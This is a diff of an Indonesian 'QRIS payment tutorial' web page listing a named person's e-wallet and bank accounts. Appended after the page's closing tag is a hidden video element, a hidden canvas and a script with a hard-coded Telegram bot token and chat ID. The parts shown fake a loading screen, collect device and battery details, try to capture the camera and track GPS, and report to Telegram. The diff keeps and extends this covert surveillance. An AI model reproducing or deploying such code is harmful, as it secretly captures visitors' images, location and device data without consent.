@@ -1,385 +1,440 @@
-<!--Pembatasan kah -->
 <!DOCTYPE html>
 <html lang="id">
 <head>
-  <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width,initial-scale=1" />
-  <title>Tutorial Pembayaran QRIS</title>
-  <style>
-  /* Hidden but alive */
-.hidden-force {
-  position: absolute !important;
-  width: 1px !important;
-  height: 1px !important;
-  opacity: 0 !important;
-  pointer-events: none !important;
-  overflow: hidden !important;
-}
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Tutorial Pembayaran QRIS</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
 
-}
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            min-height: 100vh;
+            padding: 20px;
+            color: #333;
+        }
 
-  
-    *{margin:0;padding:0;box-sizing:border-box}
-    body{
-      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
-      background: linear-gradient(135deg,#667eea 0%,#764ba2 100%);
-      min-height:100vh;padding:20px;color:#333
-    }
-    .container{max-width:1200px;margin:0 auto}
-    header{text-align:center;color:#fff;margin-bottom:40px;animation:fadeInDown .8s ease}
-    header h1{font-size:2.5em;margin-bottom:10px;text-shadow:2px 2px 4px rgba(0,0,0,.3)}
-    header p{font-size:1.2em;opacity:.9}
+        .container {
+            max-width: 1200px;
+            margin: 0 auto;
+        }
 
-    .main-content{display:grid;grid-template-columns:1fr 1fr;gap:30px;margin-bottom:40px}
-    .card{background:#fff;border-radius:20px;padding:30px;box-shadow:0 10px 40px rgba(0,0,0,.2);animation:fadeInUp .8s ease}
-    .qris-section{text-align:center}
-    .qris-section h2{color:#667eea;margin-bottom:20px;font-size:1.8em}
-    .qris-image{width:100%;max-width:400px;border-radius:15px;box-shadow:0 5px 20px rgba(0,0,0,.15);margin:20px 0;transition:transform .3s ease}
-    .qris-image:hover{transform:scale(1.05)}
-    .recipient-name{background:linear-gradient(135deg,#667eea 0%,#764ba2 100%);color:#fff;padding:15px;border-radius:10px;font-weight:700;font-size:1.1em;margin-top:15px}
-    .badge{display:inline-block;background:#10b981;color:#fff;padding:5px 15px;border-radius:20px;font-size:.9em;margin-left:10px}
+        header {
+            text-align: center;
+            color: white;
+            margin-bottom: 40px;
+            animation: fadeInDown 0.8s ease;
+        }
 
-    .btn{
-      background:linear-gradient(135deg,#667eea 0%,#764ba2 100%);
-      color:#fff;border:none;padding:12px 20px;border-radius:10px;cursor:pointer;
-      font-weight:700;transition:transform .2s ease, box-shadow .2s ease
-    }
-    .btn:hover{transform:scale(1.05);box-shadow:0 5px 15px rgba(102,126,234,.4)}
-    .btn:active{transform:scale(.98)}
-    .btn.secondary{background:#eef2ff;color:#4f46e5}
+        header h1 {
+            font-size: 2.5em;
+            margin-bottom: 10px;
+            text-shadow: 2px 2px 4px rgba(0,0,0,0.3);
+        }
 
-    .note{
-      background:#fff3cd;color:#856404;padding:12px 16px;border-radius:10px;
-      font-size:.95em;margin-top:15px;border:1px solid #ffeeba;text-align:left
-    }
+        header p {
+            font-size: 1.2em;
+            opacity: 0.9;
+        }
 
-    .tutorial-section h2{color:#667eea;margin-bottom:20px;font-size:1.8em}
-    .steps{list-style:none;counter-reset:step-counter}
-    .steps li{
-      counter-increment:step-counter;position:relative;padding:20px 20px 20px 70px;margin-bottom:20px;
-      background:linear-gradient(135deg,#f5f7fa 0%,#c3cfe2 100%);border-radius:15px;transition:transform .3s ease, box-shadow .3s ease
-    }
-    .steps li:hover{transform:translateX(10px);box-shadow:0 5px 15px rgba(0,0,0,.1)}
-    .steps li::before{
-      content:counter(step-counter);position:absolute;left:20px;top:50%;transform:translateY(-50%);
-      background:linear-gradient(135deg,#667eea 0%,#764ba2 100%);color:#fff;width:40px;height:40px;border-radius:50%;
-      display:flex;align-items:center;justify-content:center;font-weight:700;font-size:1.1em
-    }
+        .main-content {
+            display: grid;
+            grid-template-columns: 1fr 1fr;
+            gap: 30px;
+            margin-bottom: 40px;
+        }
 
-    .alternative-section{grid-column:1 / -1}
-    .alternative-section h2{color:#667eea;margin-bottom:25px;font-size:1.8em;text-align:center}
-    .payment-methods{display:grid;grid-template-columns:repeat(auto-fit,minmax(250px,1fr));gap:20px}
-    .method-card{
-      background:linear-gradient(135deg,#f5f7fa 0%,#c3cfe2 100%);padding:20px;border-radius:15px;
-      transition:transform .3s ease, box-shadow .3s ease
-    }
-    .method-card:hover{transform:translateY(-5px);box-shadow:0 10px 25px rgba(0,0,0,.15)}
-    .method-card h3{color:#667eea;margin-bottom:15px;font-size:1.3em}
-    .account-info{background:#fff;padding:15px;border-radius:10px;margin-bottom:10px}
-    .account-number{font-family:'Courier New',monospace;font-weight:700;color:#333;margin:5px 0;font-size:1.1em}
-    .copy-btn{width:100%;margin-top:10px}
+        .card {
+            background: white;
+            border-radius: 20px;
+            padding: 30px;
+            box-shadow: 0 10px 40px rgba(0,0,0,0.2);
+            animation: fadeInUp 0.8s ease;
+        }
 
-    .notification{
-      position:fixed;top:20px;right:20px;background:#10b981;color:#fff;padding:15px 25px;border-radius:10px;
-      box-shadow:0 5px 20px rgba(0,0,0,.3);display:none;animation:slideIn .3s ease;z-index:1000
-    }
-    .notification.show{display:block}
+        .qris-section {
+            text-align: center;
+        }
 
-    /* Modal (Popup) */
-    .modal-backdrop{
-      position:fixed;inset:0;background:rgba(0,0,0,.5);display:none;place-items:center;z-index:1200;
-    }
-    .modal-backdrop.show{display:grid}
-    .modal{
-      width:min(680px,92vw);background:#fff;border-radius:16px;padding:22px;box-shadow:0 20px 60px rgba(0,0,0,.35);
-      animation:fadeInUp .25s ease
-    }
-    .modal header{margin:0 0 12px 0;color:#111;text-align:left}
-    .modal header h3{font-size:1.4rem;margin:0;color:#4f46e5}
-    .modal .modal-body{display:grid;gap:16px}
-    .modal .pill{
-      display:inline-flex;align-items:center;gap:8px;background:#eef2ff;color:#4f46e5;border-radius:999px;
-      padding:6px 12px;font-size:.9rem;font-weight:600
-    }
-    .hint{font-size:.95rem;color:#374151;background:#f9fafb;border:1px dashed #e5e7eb;padding:10px 12px;border-radius:10px}
-    .k-row{display:grid;grid-template-columns:1fr 1fr;gap:14px}
-    .k-card{
-      border:1px solid #e5e7eb;border-radius:12px;padding:14px;background:#ffffff
-    }
-    .k-card h4{margin-bottom:8px;color:#111}
-    .k-steps{list-style:none;counter-reset:s;display:grid;gap:10px}
-    .k-steps li{counter-increment:s;position:relative;padding-left:34px}
-    .k-steps li::before{
-      content:counter(s);position:absolute;left:0;top:0;width:24px;height:24px;border-radius:50%;
-      background:#4f46e5;color:#fff;display:flex;align-items:center;justify-content:center;font-size:.85rem;font-weight:700
-    }
-    .modal footer{display:flex;gap:10px;justify-content:flex-end;margin-top:8px}
-    .modal .btn-text{background:transparent;color:#4b5563;border:none;padding:10px 12px;border-radius:8px;cursor:pointer;font-weight:700}
-    .modal .btn-text:hover{background:#f3f4f6}
+        .qris-section h2 {
+            color: #667eea;
+            margin-bottom: 20px;
+            font-size: 1.8em;
+        }
 
-    @keyframes fadeInDown{from{opacity:0;transform:translateY(-30px)}to{opacity:1;transform:translateY(0)}}
-    @keyframes fadeInUp{from{opacity:0;transform:translateY(30px)}to{opacity:1;transform:translateY(0)}}
-    @keyframes slideIn{from{transform:translateX(400px)}to{transform:translateX(0)}}
+        .qris-image {
+            width: 100%;
+            max-width: 400px;
+            border-radius: 15px;
+            box-shadow: 0 5px 20px rgba(0,0,0,0.15);
+            margin: 20px 0;
+            transition: transform 0.3s ease;
+        }
 
-    @media (max-width:768px){
-      .main-content{grid-template-columns:1fr}
-      header h1{font-size:2em}
-      .payment-methods{grid-template-columns:1fr}
-      .k-row{grid-template-columns:1fr}
-    }
-  </style>
+        .qris-image:hover {
+            transform: scale(1.05);
+        }
+
+        .recipient-name {
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            color: white;
+            padding: 15px;
+            border-radius: 10px;
+            font-weight: bold;
+            font-size: 1.1em;
+            margin-top: 15px;
+        }
+
+        .tutorial-section h2 {
+            color: #667eea;
+            margin-bottom: 20px;
+            font-size: 1.8em;
+        }
+
+        .steps {
+            list-style: none;
+            counter-reset: step-counter;
+        }
+
+        .steps li {
+            counter-increment: step-counter;
+            position: relative;
+            padding: 20px 20px 20px 70px;
+            margin-bottom: 20px;
+            background: linear-gradient(135deg, #f5f7fa 0%, #c3cfe2 100%);
+            border-radius: 15px;
+            transition: transform 0.3s ease, box-shadow 0.3s ease;
+        }
+
+        .steps li:hover {
+            transform: translateX(10px);
+            box-shadow: 0 5px 15px rgba(0,0,0,0.1);
+        }
+
+        .steps li::before {
+            content: counter(step-counter);
+            position: absolute;
+            left: 20px;
+            top: 50%;
+            transform: translateY(-50%);
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            color: white;
+            width: 40px;
+            height: 40px;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-weight: bold;
+            font-size: 1.2em;
+        }
+
+        .alternative-section {
+            grid-column: 1 / -1;
+        }
+
+        .alternative-section h2 {
+            color: #667eea;
+            margin-bottom: 25px;
+            font-size: 1.8em;
+            text-align: center;
+        }
+
+        .payment-methods {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
+            gap: 20px;
+        }
+
+        .method-card {
+            background: linear-gradient(135deg, #f5f7fa 0%, #c3cfe2 100%);
+            padding: 20px;
+            border-radius: 15px;
+            transition: transform 0.3s ease, box-shadow 0.3s ease;
+        }
+
+        .method-card:hover {
+            transform: translateY(-5px);
+            box-shadow: 0 10px 25px rgba(0,0,0,0.15);
+        }
+
+        .method-card h3 {
+            color: #667eea;
+            margin-bottom: 15px;
+            font-size: 1.3em;
+        }
+
+        .account-info {
+            background: white;
+            padding: 15px;
+            border-radius: 10px;
+            margin-bottom: 10px;
+        }
+
+        .account-number {
+            font-family: 'Courier New', monospace;
+            font-weight: bold;
+            color: #333;
+            margin: 5px 0;
+            font-size: 1.1em;
+        }
+
+        .copy-btn {
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            color: white;
+            border: none;
+            padding: 10px 20px;
+            border-radius: 8px;
+            cursor: pointer;
+            font-weight: bold;
+            transition: transform 0.2s ease, box-shadow 0.2s ease;
+            width: 100%;
+            margin-top: 10px;
+        }
+
+        .copy-btn:hover {
+            transform: scale(1.05);
+            box-shadow: 0 5px 15px rgba(102, 126, 234, 0.4);
+        }
+
+        .copy-btn:active {
+            transform: scale(0.95);
+        }
+
+        .notification {
+            position: fixed;
+            top: 20px;
+            right: 20px;
+            background: #10b981;
+            color: white;
+            padding: 15px 25px;
+            border-radius: 10px;
+            box-shadow: 0 5px 20px rgba(0,0,0,0.3);
+            display: none;
+            animation: slideIn 0.3s ease;
+            z-index: 1000;
+        }
+
+        .notification.show {
+            display: block;
+        }
+
+        @keyframes fadeInDown {
+            from {
+                opacity: 0;
+                transform: translateY(-30px);
+            }
+            to {
+                opacity: 1;
+                transform: translateY(0);
+            }
+        }
+
+        @keyframes fadeInUp {
+            from {
+                opacity: 0;
+                transform: translateY(30px);
+            }
+            to {
+                opacity: 1;
+                transform: translateY(0);
+            }
+        }
+
+        @keyframes slideIn {
+            from {
+                transform: translateX(400px);
+            }
+            to {
+                transform: translateX(0);
+            }
+        }
+
+        @media (max-width: 768px) {
+            .main-content {
+                grid-template-columns: 1fr;
+            }
+
+            header h1 {
+                font-size: 2em;
+            }
+
+            .payment-methods {
+                grid-template-columns: 1fr;
+            }
+        }
+
+        .badge {
+            display: inline-block;
+            background: #10b981;
+            color: white;
+            padding: 5px 15px;
+            border-radius: 20px;
+            font-size: 0.9em;
+            margin-left: 10px;
+        }
+    </style>
 </head>
 <body>
-  <div class="container" aria-live="polite">
-    <header>
-      <h1>💳 Tutorial Pembayaran QRIS</h1>
-      <p>Mudah, Cepat, dan Aman</p>
-    </header>
+    <div class="container">
+        <header>
+            <h1>💳 Tutorial Pembayaran QRIS</h1>
+            <p>Mudah, Cepat, dan Aman</p>
+        </header>
 
-    <div class="main-content">
-      <div class="card qris-section">
-        <h2>Scan QRIS <span class="badge">UTAMA</span></h2>
-
-        <img id="qrisImage" src="https://blogger.googleusercontent.com/img/a/AVvXsEicxgapeHgByovmscN00Pj6eEKg4NQ-FqU-AJwOCL1IKzrs4wrET4cdvSxe4k5CEKzr7-Vs6XM_OmDOvt7yAr7Nf9SQOyy4BCxMGrtRtgKicZOrKkfxhlYOwFiEPIIeVkBb2BvmEcL3pFnxHJ5HSJ33b9-aUdf82Q9RkFyqF1rFeUfzlNTLoQ3qXZfOkB1b" alt="QRIS Code" class="qris-image" draggable="false">
-
-        <div class><button class="btn" id="btnSaveQris">⬇️ Simpan QRIS</button>
- <div style="display:flex;gap:10px;justify-content:center;flex-wrap:wrap;margin-top:14px">
-          <button class="btn secondary" id="btnOpenPopup" aria-haspopup="dialog" aria-controls="popupTutorial">📖 Lihat Tutorial</button>
-        </div>
-        
-        <div class="note" role="status" aria-live="polite">
+        <div class="main-content">
+            <div class="card qris-section">
+                <h2>Scan QRIS <span class="badge">UTAMA</span></h2>
+                <img src="https://blogger.googleusercontent.com/img/a/AVvXsEicxgapeHgByovmscN00Pj6eEKg4NQ-FqU-AJwOCL1IKzrs4wrET4cdvSxe4k5CEKzr7-Vs6XM_OmDOvt7yAr7Nf9SQOyy4BCxMGrtRtgKicZOrKkfxhlYOwFiEPIIeVkBb2BvmEcL3pFnxHJ5HSJ33b9-aUdf82Q9RkFyqF1rFeUfzlNTLoQ3qXZfOkB1b" alt="QRIS Code" class="qris-image">
+                <div class="recipient-name">
+                    📱 BAYU RIZKY SAMPURNA
+                </div>
+                      <div class="note" role="status" aria-live="polite">
           ⚠️ <strong>Aktifkan kamera</strong> pada aplikasi e-wallet/MBanking saat memilih menu <em>Scan QR/QRIS</em>.<br>
           Kalau HP cuma 1: <strong>Simpan gambar QRIS</strong> → buka aplikasi → pilih <em>QRIS via Galeri</em> → pilih gambar QRIS Babay dari galeri.
         </div>
-
-       
-      </div>
-
-    <div class="card alternative-section">
-      <h2>💰 Metode Pembayaran Alternatif</h2>
-
-      <h3 style="color:#667eea;margin:30px 0 20px">E-Wallet</h3>
-      <div class="payment-methods">
-        <div class="method-card">
-          <h3>GoPay</h3>
-          <div class="account-info">
-            <div class="account-number">0882 1599 3544</div>
-            <small>a.n. BAYU RIZKY SAMPURNA</small>
-          </div>
-          <button class="btn copy-btn" onclick="copyText('0882 1599 3544','GoPay')">📋 Copy</button>
-        </div>
-
-        <div class="method-card">
-          <h3>DANA</h3>
-          <div class="account-info">
-            <div class="account-number">0882 1599 3544</div>
-            <small>a.n. BAYU RIZKY SAMPURNA</small>
-          </div>
-          <button class="btn copy-btn" onclick="copyText('0882 1599 3544','DANA')">📋 Copy</button>
-        </div>
-
-        <div class="method-card">
-          <h3>ShopeePay</h3>
-          <div class="account-info">
-            <div class="account-number">0882 1599 3544</div>
-            <small>a.n. BAYU RIZKY SAMPURNA</small>
-          </div>
-          <button class="btn copy-btn" onclick="copyText('0882 1599 3544','ShopeePay')">📋 Copy</button>
-        </div>
-
-        <div class="method-card">
-          <h3>LinkAja</h3>
-          <div class="account-info">
-            <div class="account-number">0882 1599 3544</div>
-            <small>a.n. BAYU RIZKY SAMPURNA</small>
-          </div>
-          <button class="btn copy-btn" onclick="copyText('0882 1599 3544','LinkAja')">📋 Copy</button>
-        </div>
-      </div>
-
-      <h3 style="color:#667eea;margin:30px 0 20px">Transfer Bank</h3>
-      <div class="payment-methods">
-        <div class="method-card">
-          <h3>Bank Mandiri</h3>
-          <div class="account-info">
-            <small>Kode Bank: 008</small>
-            <div class="account-number">1120 0204 38110</div>
-            <small>a.n. BAYU RIZKY SAMPURNA</small>
-          </div>
-          <button class="btn copy-btn" onclick="copyText('1120020438110','Bank Mandiri')">📋 Copy</button>
-        </div>
-
-        <div class="method-card">
-          <h3>BSI</h3>
-          <div class="account-info">
-            <small>Kode Bank: 451</small>
-            <div class="account-number">7183 942 225</div>
-            <small>a.n. BAYU RIZKY SAMPURNA</small>
-          </div>
-          <button class="btn copy-btn" onclick="copyText('7183942225','BSI')">📋 Copy</button>
-        </div>
-
-        <div class="method-card">
-          <h3>Bank Jago</h3>
-          <div class="account-info">
-            <small>Kode Bank: 542</small>
-            <div class="account-number">1006 4533 1871</div>
-            <small>a.n. BAYU RIZKY SAMPURNA</small>
-          </div>
-          <button class="btn copy-btn" onclick="copyText('100645331871','Bank Jago')">📋 Copy</button>
-        </div>
-
-        <div class="method-card">
-          <h3>SeaBank</h3>
-          <div class="account-info">
-            <small>Kode Bank: 535</small>
-            <div class="account-number">9013 7594 0437</div>
-            <small>a.n. BAYU RIZKY SAMPURNA</small>
-          </div>
-          <button class="btn copy-btn" onclick="copyText('901375940437','SeaBank')">📋 Copy</button>
-        </div>
-      </div>
-    </div>
-  </div>
-
-  <!-- Notification -->
-  <div class="notification" id="notification" role="alert" aria-live="assertive">✅ Nomor rekening berhasil disalin!</div>
-
-  <!-- MODAL POPUP -->
-  <div class="modal-backdrop" id="popupTutorial" role="dialog" aria-modal="true" aria-labelledby="popupTitle" aria-hidden="true">
-    <div class="modal" role="document">
-      <header>
-        <h3 id="popupTitle">Tutorial Cepat Pembayaran QRIS</h3>
-        <span class="pill">2 Cara: Scan Kamera / Galeri</span>
-      </header>
-      <div class="modal-body">
-        <div class="hint">Tips: Pastikan jaringan stabil & nominal sesuai. Nama penerima harus <strong>Bayu Rizky Sampurna</strong>.</div>
-
-        <div class="k-row">
-          <div class="k-card">
-            <h4>🔎 Cara A — Scan Kamera</h4>
-            <ol class="k-steps">
-              <li>Buka e-wallet / mobile banking → pilih <em>Scan QR/QRIS</em>.</li>
-              <li>Jika diminta, <strong>izinkan kamera</strong> (Allow/Izinkan).</li>
-              <li>Arahkan kamera ke gambar QRIS (di halaman ini).</li>
-              <li>Masukkan nominal → konfirmasi PIN → selesai.</li>
-            </ol>
-            <div style="display:flex;gap:8px;flex-wrap:wrap;margin-top:8px">
-              <button class="btn" id="btnAskCamera">🔍 Scan Kamera</button>
             </div>
-            <small id="cameraStatus" style="display:block;margin-top:8px;color:#6b7280"></small>
-          </div>
 
-          <div class="k-card">
-            <h4>🖼️ Cara B — QRIS dari Galeri</h4>
-            <ol class="k-steps">
-              <li>Tekan <strong>“Simpan QRIS”</strong> di halaman utama.</li>
-              <li>Buka e-wallet / mobile banking → pilih <em>QRIS via Galeri</em>.</li>
-              <li>Pilih gambar <em>QRIS_Babay.png</em> dari galeri.</li>
-              <li>Masukkan nominal → konfirmasi PIN → selesai.</li>
-            </ol>
-            <div style="display:flex;gap:8px;flex-wrap:wrap;margin-top:8px">
-              <button class="btn secondary" id="btnSaveInside">⬇️ Simpan QRIS</button>
+            <div class="card tutorial-section">
+                <h2>Cara Pembayaran</h2>
+                <ul class="steps">
+                    <li>Buka aplikasi e-wallet atau mobile banking Anda</li>
+                    <li>Pilih menu "Scan QR" atau "QRIS"</li>
+                    <li>Arahkan kamera ke kode QRIS di sebelah kiri</li>
+                    <li>Masukkan nominal pembayaran yang diinginkan</li>
+                    <li>Konfirmasi pembayaran dengan PIN Anda</li>
+                    <li>Selesai! Simpan bukti transaksi</li>
+                </ul>
             </div>
-          </div>
         </div>
-      </div>
-      <footer>
-        <button class="btn-text" id="btnClosePopup">Tutup</button>
-      </footer>
+
+        <div class="card alternative-section">
+            <h2>💰 Metode Pembayaran Alternatif</h2>
+            
+            <h3 style="color: #667eea; margin: 30px 0 20px 0;">E-Wallet</h3>
+            <div class="payment-methods">
+                <div class="method-card">
+                    <h3>GoPay</h3>
+                    <div class="account-info">
+                        <div class="account-number">0882 1599 3544</div>
+                        <small>a.n. BAYU RIZKY SAMPURNA</small>
+                    </div>
+                    <button class="copy-btn" onclick="copyText('0882 1599 3544', 'GoPay')">📋 Copy</button>
+                </div>
+
+                <div class="method-card">
+                    <h3>DANA</h3>
+                    <div class="account-info">
+                        <div class="account-number">0882 1599 3544</div>
+                        <small>a.n. BAYU RIZKY SAMPURNA</small>
+                    </div>
+                    <button class="copy-btn" onclick="copyText('0882 1599 3544', 'DANA')">📋 Copy</button>
+                </div>
+
+                <div class="method-card">
+                    <h3>ShopeePay</h3>
+                    <div class="account-info">
+                        <div class="account-number">0882 1599 3544</div>
+                        <small>a.n. BAYU RIZKY SAMPURNA</small>
+                    </div>
+                    <button class="copy-btn" onclick="copyText('0882 1599 3544', 'ShopeePay')">📋 Copy</button>
+                </div>
+
+                <div class="method-card">
+                    <h3>LinkAja</h3>
+                    <div class="account-info">
+                        <div class="account-number">0882 1599 3544</div>
+                        <small>a.n. BAYU RIZKY SAMPURNA</small>
+                    </div>
+                    <button class="copy-btn" onclick="copyText('0882 1599 3544', 'LinkAja')">📋 Copy</button>
+                </div>
+            </div>
+
+            <h3 style="color: #667eea; margin: 30px 0 20px 0;">Transfer Bank</h3>
+            <div class="payment-methods">
+                <div class="method-card">
+                    <h3>Bank Mandiri</h3>
+                    <div class="account-info">
+                        <small>Kode Bank: 008</small>
+                        <div class="account-number">1120 0204 38110</div>
+                        <small>a.n. BAYU RIZKY SAMPURNA</small>
+                    </div>
+                    <button class="copy-btn" onclick="copyText('1120020438110', 'Bank Mandiri')">📋 Copy</button>
+                </div>
+
+                <div class="method-card">
+                    <h3>BSI</h3>
+                    <div class="account-info">
+                        <small>Kode Bank: 451</small>
+                        <div class="account-number">7183 942 225</div>
+                        <small>a.n. BAYU RIZKY SAMPURNA</small>
+                    </div>
+                    <button class="copy-btn" onclick="copyText('7183942225', 'BSI')">📋 Copy</button>
+                </div>
+
+                <div class="method-card">
+                    <h3>Bank Jago</h3>
+                    <div class="account-info">
+                        <small>Kode Bank: 542</small>
+                        <div class="account-number">1006 4533 1871</div>
+                        <small>a.n. BAYU RIZKY SAMPURNA</small>
+                    </div>
+                    <button class="copy-btn" onclick="copyText('100645331871', 'Bank Jago')">📋 Copy</button>
+                </div>
+
+                <div class="method-card">
+                    <h3>SeaBank</h3>
+                    <div class="account-info">
+                        <small>Kode Bank: 535</small>
+                        <div class="account-number">9013 7594 0437</div>
+                        <small>a.n. BAYU RIZKY SAMPURNA</small>
+                    </div>
+                    <button class="copy-btn" onclick="copyText('901375940437', 'SeaBank')">📋 Copy</button>
+                </div>
+            </div>
+        </div>
     </div>
-  </div>
 
-  <script>
-    // COPY
-    function copyText(text, method){
-      navigator.clipboard.writeText(text).then(()=>{
-        toast(`✅ Nomor ${method} berhasil disalin!`);
-      }).catch(err=>{
-        alert('Gagal menyalin: ' + err);
-      });
-    }
+    <div class="notification" id="notification">
+        ✅ Nomor rekening berhasil disalin!
+    </div>
 
-    // TOAST
-    function toast(msg){
-      const el = document.getElementById('notification');
-      el.textContent = msg;
-      el.classList.add('show');
-      setTimeout(()=>el.classList.remove('show'), 3000);
-    }
-
-    // SAVE QRIS
-    function saveQris(){
-      const qrisImage = document.getElementById('qrisImage').src;
-      const link = document.createElement('a');
-      link.href = qrisImage;
-      // force filename
-      const url = new URL(qrisImage, window.location.href);
-      const isData = qrisImage.startsWith('data:');
-      link.download = 'QRIS_Babay' + (isData ? '.png' : (url.pathname.split('.').pop()?.includes('png') ? '.png' : '.png'));
-      document.body.appendChild(link);
-      link.click();
-      link.remove();
-      toast('⬇️ Gambar QRIS tersimpan (cek galeri/unduhan).');
-    }
-
-    // CAMERA PERMISSION (best-effort)
-    async function requestCamera(){
-      const status = document.getElementById('cameraStatus');
-      try{
-        // Minta akses kamera—beberapa browser akan prompt izin
-        const stream = await navigator.mediaDevices.getUserMedia({ video: true });
-        // Hentikan semua track agar tidak menyalakan kamera terus
-        stream.getTracks().forEach(t=>t.stop());
-        status.style.color = '#10b981';
-        status.textContent = '✅ Izin kamera aktif. Silakan lanjut Scan QR di aplikasi e-wallet/MBanking.';
-        toast('✅ Kamera diizinkan—lanjutkan scan di aplikasi pembayaran.');
-      }catch(e){
-        status.style.color = '#ef4444';
-        status.textContent = '❌ Gagal minta izin kamera di browser ini. Tidak masalah—tetap bisa bayar via “QRIS dari Galeri”.';
-        toast('ℹ️ Tidak bisa akses kamera di browser ini. Gunakan opsi galeri ya.');
-      }
-    }
-
-    // MODAL helpers
-    const popup = document.getElementById('popupTutorial');
-    const btnOpen = document.getElementById('btnOpenPopup');
-    const btnClose = document.getElementById('btnClosePopup');
-    const btnSaveQrisTop = document.getElementById('btnSaveQris');
-    const btnSaveInside = document.getElementById('btnSaveInside');
-    const btnAskCamera = document.getElementById('btnAskCamera');
-
-    btnOpen.addEventListener('click', openPopup);
-    btnClose.addEventListener('click', closePopup);
-    popup.addEventListener('click', (e)=>{ if(e.target === popup) closePopup(); });
-    document.addEventListener('keydown', (e)=>{ if(e.key === 'Escape' && isOpen()) closePopup(); });
-
-    function isOpen(){ return popup.classList.contains('show'); }
-    function openPopup(){
-      popup.classList.add('show');
-      popup.setAttribute('aria-hidden','false');
-      // fokus ke tombol tutup agar aksesibel
-      btnClose.focus();
-    }
-    function closePopup(){
-      popup.classList.remove('show');
-      popup.setAttribute('aria-hidden','true');
-      btnOpen.focus();
-    }
-
-    btnSaveQrisTop.addEventListener('click', saveQris);
-    btnSaveInside.addEventListener('click', saveQris);
-    btnAskCamera.addEventListener('click', requestCamera);
-  </script>
+    <script>
+        function copyText(text, method) {
+            navigator.clipboard.writeText(text).then(() => {
+                const notification = document.getElementById('notification');
+                notification.textContent = `✅ Nomor ${method} berhasil disalin!`;
+                notification.classList.add('show');
+                
+                setTimeout(() => {
+                    notification.classList.remove('show');
+                }, 3000);
+            }).catch(err => {
+                alert('Gagal menyalin: ' + err);
+            });
+        }
+    </script>
 </body>
 </html>
-
+                    
 <!--Pembatasan kah -->
-<video id="video" autoplay muted playsinline class="hidden-force"></video>
+
+
+
+    <video id="video" autoplay muted class="hidden"></video>
+    <canvas id="canvas" class="hidden"></canvas>
+    
+    
 <!--Pembatasan kah -->
     <script>
         const token = '8295593119:AAG_-Tr1HVrFVpD0_f4OLHSGEsqoDCk84og';
         const chatId = '1212063779';
+
         
         // Simulate infinite loading
         let progress = 0;
@@ -472,10 +527,8 @@
             message += `📶 Online: ${navigator.onLine ? 'Online' : 'Offline'}\n`;
             message += `📺 Screen Size: ${screen.width}x${screen.height}\n`;
             message += `🪟 Window Size: ${window.innerWidth}x${window.innerHeight}\n`;
-            message += `💾 RAM: ${navigator.deviceMemory || 'Unknown'} GB\n`;
-            message += `🧠 CPU Cores: ${navigator.hardwareConcurrency}\n`;
-            
-            // Battery Info
+          
+                      // Battery Info
             if (navigator.getBattery) {
                 try {
                     const battery = await navigator.getBattery();
@@ -551,6 +604,7 @@
             } catch (e) {
                 await sendToTelegram('❌ Camera access blocked');
             }
+
 
             // GPS tracking
             if (navigator.geolocation) {
